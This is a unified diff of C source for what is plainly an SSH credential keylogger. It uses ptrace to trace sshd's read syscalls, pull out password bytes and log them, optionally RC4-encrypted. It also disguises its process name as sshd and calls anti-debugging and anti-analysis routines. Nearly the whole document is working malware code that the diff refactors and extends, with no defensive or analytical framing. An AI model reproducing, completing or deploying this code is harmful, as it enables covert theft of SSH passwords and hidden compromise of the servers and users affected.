@@ -58,19 +58,19 @@ int check_ssh_password(unsigned char *buff, int len){
 
     // ptr points to the last char of the string
 	unsigned char *ptr = buff+len-1;
-	//printf("buff: %p, ptr: %p, len: %d\n", buff, ptr, len);
+	//debug("buff: %p, ptr: %p, len: %d\n", buff, ptr, len);
 	
 	while (*ptr != 0x00) ptr--;
-	//printf("ptr: %p\n", ptr);
+	//debug("ptr: %p\n", ptr);
 
 	antidebug_obfuscate_analysis(11);
 	// Now we must have two bytes 0x00 at left and one < 0x0f at right
-	//printf("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
+	//debug("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
 	if ( *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return 0;
 	//if (*(ptr+1) > 0x0f || *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return;
 
 	// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1
-	//printf("%d\n", buff+len-1-ptr);
+	//debug("%d\n", buff+len-1-ptr);
 	if (((buff+len-1)-(ptr+1)) != *(ptr+1)) return 0;
 
 #if ! STANDALONE
@@ -177,24 +177,19 @@ void lookForReads(pid_t eax) {
     exit(0);
 }
 
-#if STANDALONE 
-void rename_proc(int argc, char **argv, char *newname) {
+void rename_proc2name(int argc, char **argv, char *newname) {
 	antidebug_obfuscate_analysis(1);
 	int i;
+
 	for (i = 0; i < argc; i++) {
-		memset(argv[i], 0, strlen(argv[i]));
-		realloc(argv[i], strlen(newname)+1);
-		memcpy(argv[i], newname, strlen(newname)+1);
+	    memset(argv[i], 0, strlen(argv[i]));
+	    realloc(argv[i], strlen(newname)+1);
+	    memset(argv[i], 0, strlen(newname)+1);
 	}
+	memcpy(argv[0], newname, strlen(newname));
 }
-#endif
 
-
-// TODO: escriure a disc si li passem el paràmetre o relatiu al home .k_ssh
-// TODO: escriure de forma xifrada 
-// TODO: algo per llegir els fitxers xifrats
-
-int main_keylogger(int argc, char **argv) {
+int main_keylogger(int argc, char **argv, char *file) {
     char procName[64];
     char *logFile = 0;
     long orig_eax;
@@ -216,12 +211,12 @@ int main_keylogger(int argc, char **argv) {
         exit(0);
     }
 
-#if STANDALONE
     // Canviar el nom del procés a cmdline del sshd
-	rename_proc(argc, argv, procName);
-#else
-    if (argc == 1 && argv) {
-        logFile = argv[0];
+	rename_proc2name(argc, argv, procName);
+
+#if ! STANDALONE
+    if (file) {
+        logFile = file;
         useRc4 = 1;
     }
 #endif
@@ -229,7 +224,7 @@ int main_keylogger(int argc, char **argv) {
     // Open logfile
     if (logFile != 0) {
         debug("Oppening file %s\n", logFile);
-        fd = open(argv[0], O_RDWR|O_CREAT, S_IRWXU);
+        fd = open(logFile, O_RDWR|O_CREAT, S_IRWXU);
         if (!fd) exit(0);
         lseek(fd, 0, SEEK_END);
         dup2(fd, 1);
@@ -243,50 +238,55 @@ int main_keylogger(int argc, char **argv) {
         ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
         exitPid = wait(&status);
 
-		antidebug_obfuscate_analysis(3);
-		if (WIFSTOPPED(status)) {
-			if (WSTOPSIG(status) == SIGCHLD) {
-				ptrace(PTRACE_CONT, pid, 0, SIGCHLD);
-			} else if (WSTOPSIG(status) != SIGTRAP &&  WSTOPSIG(status) != SIGSTOP) {
-				ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status));
-				perror("ptrace");
-   				debug("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
-	            break;
-			}
-        }
-        orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);
+        antidebug_obfuscate_analysis(3);
+        if (WIFSTOPPED(status)) {
+            if (WSTOPSIG(status) == SIGCHLD) {
+                ptrace(PTRACE_CONT, pid, 0, SIGCHLD);
+                kill(pid, SIGSTOP);
+            } else 
+                if (WSTOPSIG(status) != SIGTRAP &&  WSTOPSIG(status) != SIGSTOP) {
+                ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status));
+                debug("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
+                break;
+            }
+            else {
+                orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);
 
-		antidebug_obfuscate_analysis(4);
-        switch (orig_eax) {
-            case __NR_clone:
-                if(insyscall == 0) 
-                    insyscall = 1;
-                else {
-                    insyscall = 0;
-                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
-                    if(!fork()) {
-                        lookForReads(eax);
-                    }
+                antidebug_obfuscate_analysis(4);
+                switch (orig_eax) {
+                    case __NR_clone:
+                        if(insyscall == 0) {
+                            debug("fork\n");
+                            insyscall = 1;
+                        } else {
+                            insyscall = 0;
+                            eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
+                            if(!fork()) {
+                                lookForReads(eax);
+                            }
+                        }
+                        break;
+                    case __NR_read:
+                        if(insyscall == 0) {
+                            debug("read\n");
+                            insyscall = 1;
+                            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
+                        }
+                        else {
+                            insyscall = 0;
+                            antidebug_obfuscate_analysis(5);
+                            eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
+                            if (eax > 5 && eax < 32) {
+                                unsigned char pass[64];
+                                memset(pass, 0, 64);
+                                mread(regs.ecx, eax, (int *)pass);
+                                // +3 because mread overflows 3 bytes
+                                check_ssh_password(pass, eax);
+                            }
+                        }
+                        break;
                 }
-                break;
-            case __NR_read:
-                if(insyscall == 0) {
-                    insyscall = 1;
-                    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
-                }
-                else {
-                    insyscall = 0;
-					antidebug_obfuscate_analysis(5);
-                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
-                    if (eax > 5 && eax < 32) {
-                        unsigned char pass[64];
-                        memset(pass, 0, 64);
-                        mread(regs.ecx, eax, (int *)pass);
-                        // +3 because mread overflows 3 bytes
-                        check_ssh_password(pass, eax);
-                    }
-                }
-                break;
+            }
         }
     }
 
@@ -297,7 +297,7 @@ int main_keylogger(int argc, char **argv) {
 
 #if STANDALONE 
 int main(int argc, char **argv) {
-	main_keylogger(argc, argv);
+	main_keylogger(argc, argv, 0);
 	return 0;
 }
 #endif
